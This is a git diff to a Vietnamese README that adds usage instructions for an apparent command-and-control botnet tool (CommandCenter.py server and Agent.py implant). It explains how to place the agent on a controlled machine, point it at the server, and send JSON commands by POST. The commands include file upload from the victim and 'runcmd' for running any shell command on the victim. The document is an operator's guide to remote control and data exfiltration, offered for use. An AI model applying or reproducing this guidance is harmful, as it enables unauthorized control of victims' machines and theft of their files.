@@ -39,3 +39,46 @@ Các máy bị nhiễm liên tục hỏi server xem lệnh tiếp theo cần th�
 ## III. Phương thức tấn công.
 - Người điều khiển biết được địa chỉ của máy chủ sẽ gửi lệnh điều khiển tới máy chủ bằng một HTTP request (Có thể qua những tool như curl hoặc Postman). Máy chủ thực hiện đặt lệnh đó làm lệnh hiện thời để chuyển lại cho máy bị nhiễm. 
 
+## IV. Cách sử dụng
+- Chuyển CommandCenter.py lên một máy chủ đã được forward IP và chạy
+- Chuyển Agent.py lên máy bị điều khiển, sửa IP và port thành IP và port của máy chủ mà trên đó CommandCenter chạy
+- Chạy agent.py. Quan sát cửa sổ dòng lệnh của CommandCenter có kết quả trả về của lệnh được thực hiện hiện tại. Lệnh mặt định ban đầu là pwd (in ra đường dẫn tuyệt đối của thư mục hiện tại)
+- Muốn điều khiển các Agent, thực hiện gửi POST request lên endpoint set_action của CommandCenter. Nội dung của request gồm lệnh muốn máy bị điều khiển thực hiện và một số thông tin khác tùy theo lệnh. Để gửi các request có thể dùng các tool như Postman (GUI) hay curl (CLI)
+- Body của các request đều phải để dưới dạng json. Định dạng các lệnh:
+pwd: 
+{
+	"command":"pwd",
+}
+
+cd
+{
+	"command":"cd",
+	"extra" : "/home/abcde" //duong dan den thu muc muon chuyen den
+}
+
+ls
+{
+	"command":"ls",
+	"extra" : "/home/abcde" //duong dan den thu muc muon liet ke file
+}
+
+upload
+{
+	"command":"upload",
+	"extra" : "abc.txt" //tên file muốn upload. File phải ở trong thư mục hiện tại
+}
+
+Standby
+{
+	"command":"Standby",
+	"extra" : "0.0012" //Khoảng thời gian standby (tính bằng giờ. 0.0012h = 5s)
+}
+
+runcmd
+{
+	"command":"runcmd",
+	"extra" : "ten command" //Lệnh muốn thực hiện trên terminal/cmd
+}
+
+![Screenshot from 2019-05-21 23-09-43](https://user-images.githubusercontent.com/32330003/58112692-36194680-7c1e-11e9-8ef1-be3d8b95f62d.png)
+
